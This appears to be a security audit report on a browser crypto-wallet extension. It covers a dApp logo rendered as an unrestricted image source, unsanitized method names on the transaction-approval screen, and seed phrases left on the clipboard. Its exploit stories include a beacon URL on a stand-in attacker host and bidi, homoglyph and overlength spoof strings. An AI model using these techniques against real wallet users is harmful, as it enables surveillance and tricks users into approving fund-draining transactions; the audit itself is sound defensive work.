CLUSTER: ext-popup-sensitive

## Findings

### [1] dApp-controlled `logo` rendered as `<img :src>` on trust/approval surfaces with no scheme allowlist (privacy beacon + UI spoof; privacy gate removed)

1. **Title** — dApp-supplied `dappMetadata.logo` string is bound directly to `<img :src>` on every dApp trust surface (connect / execute-confirm / verify / connected-apps) with no `http(s)` allowlist and no blob conversion; the field is misleadingly named `logoBlobUrl`.

2. **Impact factors** — Confidentiality (deanonymization / tracking) + Integrity of the anti-phishing UI. Blast radius: all users who interact with any malicious dApp. Data sensitivity: reveals the user's IP, that they run this wallet, and the precise timing of when they view a connection/transaction-approval (behavioral surveillance). Exploitability: attack vector NETWORK; attack complexity LOW; privileges NONE (any web page can attempt a wallet connection); user interaction REQUIRED (the approval/connected-apps view must render — which is the normal flow). Not script-XSS: `<img src>` does not execute `javascript:`; harm is the outbound fetch + arbitrary image render.

3. **Evidence confidence** — high.

4. **OWASP / CWE** — OWASP A05 (Security Misconfiguration — permissive CSP) + A01 (Broken Access Control of trust surface); CWE-200 (Exposure of Sensitive Information), CWE-1021 (Improper Restriction of Rendered UI Layers / UI redress), related CWE-918 (server-side-request-forgery-shaped outbound fetch to an attacker-chosen host from a privileged context).

5. **Trace (source → sink)**
   - Source (untrusted): dApp connection/interaction metadata `dappMetadata.logo`, typed as a bare string with no scheme validation — `apps/extension/src/wallet/services/dapp-session/spec.ts:30` (`logo?: string`).
   - Copy step (raw string, NOT a blob; name is a misnomer):
     - `apps/extension/src/composables/useDappInteractionPayload.ts:92` — `if (meta.logo) meta.logoBlobUrl = meta.logo` (comment at `:48-49` states "Copies `dapp.logo` to `dapp.logoBlobUrl` directly (post-#29 the privacy gate is gone)" — a prior protection was deliberately removed).
     - `apps/extension/src/popup/windows/verify/index.vue:160-161`
     - `apps/extension/src/popup/pages/settings/connected-apps/[id].vue:82-83`
     - `apps/extension/src/popup/pages/settings/connected-apps/index.vue:42-43`
   - Sink (`<img :src>`):
     - `apps/extension/src/components/composite/DappIdentityBlock.vue:40` — consumed by the **execute (transaction-confirmation)** window (`apps/extension/src/popup/windows/execute/index.vue:455-460`), the **discover (connection-approval)** window (`apps/extension/src/popup/windows/discover/index.vue:181-188`), and the capabilities window.
     - `apps/extension/src/popup/windows/verify/index.vue:199`
     - `apps/extension/src/popup/pages/settings/connected-apps/[id].vue:201-202`
     - `apps/extension/src/popup/pages/settings/connected-apps/index.vue:143-144`
   - Enabling condition: extension CSP declares only `script-src 'self' 'wasm-unsafe-eval'` with no `default-src` and no `img-src` — `apps/extension/manifest/manifest.config.ts:41-42` — so `img-src` is unrestricted and remote + `data:` images load.

6. **Missing control** — No `http(s)`-only scheme allowlist on `logo` before binding to `:src`; no fetch-then-`URL.createObjectURL` blob conversion (the only real `createObjectURL` in the app is `apps/extension/src/utils/files.ts:60`, unrelated); no `img-src` CSP directive to constrain the origin.

7. **Exploit story** — A malicious dApp initiates a wallet connection and sets `dappMetadata.logo = "https://attacker.example/px.gif?u=<nonce>"`. Every time the user opens the connection-approval, the per-operation execute confirmation, the verify window, or later browses Settings → Connected apps, the extension issues a GET to the attacker's server, leaking the user's current IP + a timestamp bound to "user is right now reviewing a transaction." Alternatively the dApp sets `logo` to a crafted `data:image/png;base64,...` rendering a green "Verified ✓" glyph positioned to sit beside the hostname on the anti-phishing surface, undermining the exact trust anchor the window exists to provide.

8. **Preconditions** — User interacts with (or has previously connected) a malicious/compromised dApp; no special role. Beacon works because the MV3 page CSP does not restrict `img-src`.

9. **Why mitigations fail** — `sanitizeWireString` is applied to `dapp.name` but never to `logo` (it is a URL, not display text, and the sink is an attribute not text interpolation, so HTML-escaping is irrelevant). Vue does not sanitize `:src`. A Zod `z.string().url()` at ingestion (if any) would still accept `data:` and arbitrary `https:` hosts — `URL()` treats both as valid — so type-narrowing does not close this. The homograph/`hostnameSuspicious` warnings cover the hostname text, not the logo fetch.

10. **Instances** — Copy: `useDappInteractionPayload.ts:92`, `verify/index.vue:161`, `connected-apps/[id].vue:83`, `connected-apps/index.vue:43`. Sink: `DappIdentityBlock.vue:40`, `verify/index.vue:199`, `connected-apps/[id].vue:202`, `connected-apps/index.vue:144`. Root: `dapp-session/spec.ts:30` + CSP `manifest/manifest.config.ts:41-42`.

---

### [2] dApp-controlled call/method names and args rendered on the transaction-approval surface without the wire-string sanitizer (bidi / zero-width / homoglyph / length spoofing)

1. **Title** — In the Execute confirmation window, dApp-supplied method names (`call.name` / `action.method`) and authwit args are rendered via `humanizeMethodName(...)` / `String(a)` with NO control-character strip, NO bidi/zero-width strip, and NO length clamp — the same wire-string sanitizer applied to `dapp.name`, token symbol/name, and artifact name is missing here.

2. **Impact factors** — Integrity of the transaction-confirmation display (user is shown a misleading description of what they are approving). Blast radius: all users approving dApp transactions. Data sensitivity: funds/authorization (the confirmation UI is the sole human checkpoint before signing). Exploitability: attack vector NETWORK; attack complexity LOW; privileges NONE; user interaction REQUIRED (user must approve). Not script-XSS — Vue text-interpolation HTML-escapes; the violation is visual misrepresentation, not code execution.

3. **Evidence confidence** — high (the absent sanitizer is a fact; exploit efficacy is moderate given partial mitigations in field 9).

4. **OWASP / CWE** — OWASP A04 (Insecure Design — insufficient neutralization for a security-decision display) / A03-adjacent; CWE-451 (User Interface Misrepresentation of Critical Information), CWE-1021, CWE-176 (Improper Handling of Unicode).

5. **Trace (source → sink)**
   - Source (untrusted): dApp execution payload operations `payload.value.params.operations[...]` — `apps/extension/src/popup/windows/execute/index.vue:181` iterates them straight from the interaction payload (`useDappInteractionPayload` → SW). Fields `exec.calls[].name`, `actions[].method`, `action.content.method/name`, and args are dApp-authored labels.
   - Passed as `op` into `OperationCard` — `apps/extension/src/popup/windows/execute/index.vue:476-489`.
   - Sink (unsanitized render): `humanizeMethodName(...)` at `apps/extension/src/popup/windows/execute/OperationCard.vue:118,133,149,183,342,361,401,416,433,470`; raw args at `OperationCard.vue:138` (`action.content.args.map((a) => String(a)).join(", ")`) and message hash at `:159`.
   - `humanizeMethodName` — `apps/extension/src/utils/tx-enrichment.ts:52-65`: unknown names fall through to `method.replace(/_/g, " ").replace(/\b\w/g, (c) => c.toUpperCase())`. No `\p{Cf}` strip, no length cap.

6. **Missing control** — `sanitizeWireString` / `stripWireControl` (`apps/extension/src/wallet/services/dapp-session/capability-meta.ts:155-166`, which strips bidi overrides, zero-width joiners, variation selectors, C0/C1 controls and clamps length) is applied to `dapp.name` (OperationCard.vue:232, DappIdentityBlock.vue:33), token symbol/name (OperationCard.vue:299,307), and artifact name (OperationCard.vue:447) — but NOT to the method-name or args render path.

7. **Exploit story** — A dApp sends `aztec_sendTx` with a call whose `name` is `"transfer‮…drainAll"` (RLO reorders the visible text) or a Cyrillic-homoglyph `"trаnsfer"` (won't match `METHOD_LABELS`, so it renders raw title-cased), or a 5,000-character `name` that pushes the true `AddressDisplay` target below the fold. The confirmation row then reads as a benign, familiar operation while the actual `selector` executes something else. Because the name is unrecognized, `parseTransferIntent` returns `unverified` and the structured To/Amount block is suppressed, so the only remaining truthful anchor is the target contract address — which the over-long-name variant can scroll out of view.

8. **Preconditions** — User has an active session with a malicious dApp that can request a transaction (the `transaction` capability), and reaches the Execute approval window.

9. **Why mitigations fail** — Bridge/dispatcher Zod narrowing validates that `name` is a *string* but does not neutralize its Unicode content, so type-narrowing does not help. `parseTransferIntent` (`apps/extension/src/utils/transfer-intent.ts`) is correctly hardened (canonical hex/decimal regexes, rejects attacker `toString()`) and limits the *structured* block — but the free-text method label above it is the spoof surface and is unguarded. The always-rendered `AddressDisplay` target is a partial mitigation but is defeated by the length-overflow variant (no clamp) and does not stop a user from trusting a homoglyph "Transfer" label. HTML-escaping by Vue does not remove bidi/zero-width codepoints.

10. **Instances** — `OperationCard.vue:118,133,138,149,159,183,342,361,401,416,433,470`; helper `tx-enrichment.ts:52-65`.

---

### [3] Seed phrase and plain private key written to the OS clipboard with no clear

1. **Title** — The seed-phrase and plain-private-key export flows copy the full secret to the OS clipboard on user click and never clear it (no timed wipe, no clear-on-close).

2. **Impact factors** — Confidentiality of the wallet master secret (total account compromise if harvested). Blast radius: single user per event, but catastrophic (full key). Exploitability: attack vector LOCAL (a co-resident app or a background web page polling clipboard); attack complexity LOW; privileges LOW (any local process / any focused page with `clipboard-read`); user interaction REQUIRED (user clicks Copy).

3. **Evidence confidence** — high on behavior; severity tempered because the action is user-initiated and (for the seed) an explicit on-screen warning is shown.

4. **OWASP / CWE** — OWASP A02 (Cryptographic Failures — key material exposure); CWE-522 (Insufficiently Protected Credentials), CWE-200.

5. **Trace (source → sink)**
   - Seed: `managers.profile.exportMnemonic(...)` → `phrase.value` → `window.navigator.clipboard.writeText(phrase.value)` — `apps/extension/src/popup/pages/settings/security/export/seed.vue:56-57,67-70`.
   - Key: `managers.profile.exportPlain(...)` → `privateKey.value` → `window.navigator.clipboard.writeText(...)` — `apps/extension/src/popup/pages/settings/security/export/key.vue:67,77-79`.
   - Reactive state IS cleared on unmount/timeout (`seed.vue:87-90`, `key.vue:97-101`, `useSecretCountdown.ts`), but the clipboard is not part of that teardown.

6. **Missing control** — No timed `clipboard.writeText("")` re-clear and no clear-on-unmount; the key flow shows no clipboard warning at all (the seed flow warns at `seed.vue:152-155`).

7. **Violation scenario** — User exports their seed/key and clicks Copy to paste into a password manager. The plaintext secret remains on the shared clipboard indefinitely; a clipboard-manager app, a synced-clipboard feature, or any browser tab that later calls `navigator.clipboard.readText()` (with permission) reads the full recovery secret long after the wallet popup closed.

8. **Preconditions** — User uses the built-in copy button on an export page; a local process or permitted page reads the clipboard afterward.

9. **Why mitigations fail** — The auto-close countdown and reactive-state nulling protect the on-screen render, not the clipboard. The seed warning is advisory text, not a technical control. (Caveat: a reliable timed clear from an MV3 popup is itself hard because the popup context is torn down on close — but the absence of any attempt, and the missing warning on the key page, is the gap.)

10. **Instances** — `apps/extension/src/popup/pages/settings/security/export/seed.vue:67-70`; `apps/extension/src/popup/pages/settings/security/export/key.vue:77-79`.

## Notes

Checked and judged clean (no finding):

- **No `v-html`, `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`, or string-`setTimeout` anywhere** in `popup/`, `onboarding/`, `composables/`. Classic DOM-XSS surface is absent; all dApp/chain text reaches the DOM through Vue text interpolation (HTML-escaped).
- **`explorerUrl` `<a :href>`** (`TransactionCard.vue:118-122,175`; `tx/[id].vue:124-127,161,259`) is built by `getTransactionExplorerUrl` (`apps/extension/src/wallet/constants/explorers.ts:45-54`) from a hardcoded `https://` base-URL allowlist keyed by a fixed `"aztecscan"` enum; only the wallet's own `txHash` is interpolated into the path. Not attacker-controlled, not a `javascript:` vector.
- **All other external links** are compile-time constants (`backupHelpUrl`, `reportIssueUrl`, `LANDING_URL`); every `window.open` / `chrome.windows.create` uses a constant or `chrome.runtime.getURL(...)` internal URL. `:style` / `v-bind=` / `router.push` sinks all bind internal state, never dApp strings.
- **`sanitizeWireString`** (`capability-meta.ts:155-166`) is a robust `\p{Cf}` + variation-selector + C0/C1 + length sanitizer; capability labels route through constant `getSafeDisplay` so a wire `cap.type` never lands as a raw label. Finding [2] is precisely the one render path that bypasses this otherwise-consistent control.
- **Approval gating**: discover (`discover/index.vue:44,81,100-102,228`) and execute (`execute/index.vue:80,266,317-333,525`) both disable Allow/Confirm until the trust anchor + payload are committed and (execute) token metadata prefetch settles and every send-like op has a chosen fee — closing fast-click/empty-op-list approval races.
- **Clickjacking of the approval popup**: the dApp windows are separate `chrome.windows.create({type:"popup"})` extension-origin pages, not `web_accessible_resources`, so a web page cannot frame them; no iframe redress path found.
- **Passkey ceremony** (`usePasskeyCeremony.ts`) is a thin one-shot Promise wrapper around an in-page dialog; RP-ID/origin binding is enforced by the browser WebAuthn call + the SW passkey service (out of cluster), no origin-trust decision is made here.
- **Backup import** (`useFullBackupImport.ts`) sanitizes the embedded profile name (`:142-143,177-178`) and gets real integrity from AES-GCM on encrypted backups. Its plaintext-backup `checksum` is a non-keyed SHA (`:226-227`) so the "tampered with" copy is technically overstated, but restore targets a fresh profile and requires the user to be socially-engineered into importing a hostile file — inherent to the feature, not a distinct reachable vuln; noted, not filed.
- **Secret exposure window**: seed/key export clears reactive state on unmount and on countdown timeout, but `useSecretCountdown.disable()` (`useSecretCountdown.ts:44-48`) lets the user hold the secret on-screen indefinitely — user-elected, not filed.
- **No secret material is logged** (`console.*` / logger) anywhere in the cluster (grepped mnemonic/phrase/privateKey/secret/passhash/password/seed/passkey/prf).
- **`send_transaction` display asymmetry**: unlike `aztec_sendTx`, the `send_transaction` payload rows (`OperationCard.vue:108-165`) render method + contract but no structured recipient/amount, and `aztec_sendTx` unverified calls render no args at all (contra the "indexed-args fallback" the `:168-173` comment claims). Nothing is *misrepresented* and the full payload is available via the JSON viewer (`execute/index.vue:401-406`), so this is a transparency/UX gap rather than a security misrepresentation — folded into finding [2]'s theme, not filed separately.
